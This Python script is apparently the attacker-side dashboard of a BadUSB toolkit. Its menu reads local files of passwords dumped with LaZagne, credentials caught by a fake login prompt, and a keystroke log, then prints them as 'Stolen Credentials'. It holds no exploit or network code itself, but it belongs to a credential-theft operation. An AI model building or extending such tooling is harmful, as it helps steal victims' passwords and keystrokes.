import json
import os

def view_pass_json():
    if not os.path.exists("received_pass.json"):
        print("\n[!] pass.json not found.")
        return
    with open("received_pass.json", "r") as f:
        data = json.load(f)
        for item in data:
            print(f"\n URL: {item.get('Url', '-')}")
            print(f" Username: {item.get('Username', '-')}")
            print(f" Password: {item.get('Password', '-')}")
            print("-" * 40)

def view_creds():
    if not os.path.exists("received_creds.txt"):
        print("\n[!] Credentials file not found.")
        return
    with open("received_creds.txt", "r") as f:
        print("\n📥 Stolen Credentials:\n")
        print(f.read())

def view_klog():
    if not os.path.exists("received_klog.txt"):
        print("\n[!] Keystroke log not found.")
        return
    with open("received_klog.txt", "r") as f:
        print("\n⌨️ Keystroke Log:\n")
        print(f.read())

def main():
    while True:
        print("\n=== BadUSB Dashboard ===")
        print("[1] View LaZagne obtained passwords ")
        print("[2] View Fake Prompt Credentials")
        print("[3] View Keystroke Log :)")
        print("[0] Exit")

        choice = input("Select an option: ")

        if choice == "1":
            view_pass_json()
        elif choice == "2":
            view_creds()
        elif choice == "3":
            view_klog()
        elif choice == "0":
            break
        else:
            print("Invalid choice. Try again.")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n[+] Dashboard closed by user. Goodbye! \n")
